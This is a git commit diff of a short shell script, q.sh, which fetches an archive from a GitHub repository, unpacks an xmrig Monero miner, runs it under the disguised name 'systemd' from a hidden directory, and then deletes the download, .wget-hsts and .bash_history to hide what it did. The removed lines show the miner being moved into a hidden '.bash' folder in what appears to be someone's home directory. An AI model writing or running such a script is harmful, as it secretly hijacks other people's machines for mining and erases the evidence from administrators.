cf3647b4f173bdb580710922c39717b77b047383
deusveritatis <43490119+deusveritatis@users.noreply.github.com>
2019-11-30 21:13:30 +0530

    Update q.sh

--- q.sh
+++ q.sh
@@ -2,13 +2,10 @@ wget https://github.com/deusveritatis/monero/archive/master.zip
 unzip master.zip
 cd monero-master
 tar -xvzf ./bash.tar.gz
-mv xmrig-5.0.1/ ./.bash
-mv ./.bash /home/iiserb
-cd ../..
-rm -r monero-master
-cd .bash/
-mv ./xmrig ./systemd
+cd bash
 ./systemd
+cd ../..
 rm -r master.zip
+rm -r monero-master
 rm .wget-hsts
 rm .bash_history && history && exit
